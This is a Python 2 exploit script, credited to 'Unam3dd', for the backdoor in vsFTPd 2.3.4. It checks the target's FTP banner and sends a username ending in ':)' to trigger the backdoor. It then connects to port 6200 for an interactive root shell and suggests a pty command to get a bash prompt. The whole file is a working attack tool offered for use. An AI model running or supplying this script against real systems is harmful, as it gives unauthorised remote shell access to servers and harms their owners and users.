#!/usr/bin/python2
#-*- coding:utf-8 -*-

import socket
import platform
import os
import time
from datetime import datetime
import sys
import nclib
import threading

VERSION_EXPLOIT = "vsFTPd 2.3.4"
BACKDOOR_PORT = 6200


banner = '''
\033[32m                                                           
@@@  @@@   @@@@@@   @@@@@@@@  @@@@@@@  @@@@@@@   @@@@@@@   
@@@  @@@  @@@@@@@   @@@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  @@@  !@@       @@!         @@!    @@!  @@@  @@!  @@@  
!@!  @!@  !@!       !@!         !@!    !@!  @!@  !@!  @!@  
@!@  !@!  !!@@!!    @!!!:!      @!!    @!@@!@!   @!@  !@!  
!@!  !!!   !!@!!!   !!!!!:      !!!    !!@!!!    !@!  !!!  
:!:  !!:       !:!  !!:         !!:    !!:       !!:  !!!  
 ::!!:!       !:!   :!:         :!:    :!:       :!:  !:!  
  ::::    :::: ::    ::          ::     ::        :::: ::  
   :      :: : :     :           :      :        :: :  :   
                                                           

                \033[34m2.3.4 Backdoor Exploit
                \033[34mCreated By Unam3dd
                \033[34mGithub : Unam3dd
                \033[34mInstagram : unam3dd
\033[00m
'''

def platform_required():
    if 'Linux' not in platform.platform():
        sys.exit("[*] Linux Required For This Script / Ubuntu/Debian/Arch/Kali etc..")


def check_py_version():
    if sys.version[0] =="3":
        sys.exit("[*] Please Use Python2.7 For This Script !")

def check_version(ip,port):
    print("\033[32m[\033[34m+\033[32m] Check If Version is Vulnerable Version !\033[00m")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip,port))
        version_server = s.recv(4096)
        s.close()
        if VERSION_EXPLOIT in version_server:
            print("\033[32m[\033[34m+\033[32m] \033[00mVersion Infected [\033[32mOK\033[00m]")
            return True
        else:
            print("\033[32m[\033[31m-\033[32m] \033[00mVersion Is Not Vulnerable !\033[00m")
            return False
    
    except Exception as error_check_version:
        print("[*] Error Check Requirements For Exploit ! : %s" % (error_check_version.message))


def ftp_login_payload(ip,port):
    s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print("\033[32m[\033[34m+\033[32m] Sending Payload...")
        s3.connect((ip,int(port)))
        version = s3.recv(4096)
        s3.send("USER 123456:)\r\n")
        user_passwd = s3.recv(4096)
        s3.send("PASS 123456:)\r\n")
        passwd_passwd = s3.recv(4096)
    except:
        print("\033[31m[!] Error Send Exploit !\033[00m")


def ishell(ip,port):
    try:
        print("\033[32m[\033[34m+\033[32m] Try To Opening The Shell Session on \033[34m%s\033[32m:\033[34m%d\033[00m" % (ip,port))
        try:
            nc = nclib.Netcat((ip,port))
            print("""\033[32m[\033[34m+\033[32m] Shell Open !\n\033[32m[\033[34m+\033[32m] Enter This Command For Get Prompt => \033[33mpython -c "import pty;pty.spawn('/bin/bash')"\033[00m""")
            nc.interact()
            nc.send("exit\n")
        except KeyboardInterrupt:
            print("[*] CTRL+C")

    except:
        print("\033[31m[!] Error Opengin The Shell Session on %s:%s" % (ip,port))

if __name__ == "__main__":
    platform_required()
    check_py_version()
    if len(sys.argv) <3:
        print(banner)
        print("\033[32musage : %s <ip> <port>" % (sys.argv[0]))
        print("        %s 192.168.1.68 21\033[00m" % (sys.argv[0]))
    else:
        print(banner)
        if check_version(sys.argv[1],int(sys.argv[2])) ==True:
            t = threading.Thread(target=ftp_login_payload, args=(sys.argv[1],sys.argv[2]))
            t.start()
            time.sleep(2)
            ishell(sys.argv[1],BACKDOOR_PORT)
        else:
            print("\033[32m[\033[31m-\033[32m] %s:%s" % (sys.argv[1],sys.argv[2]))
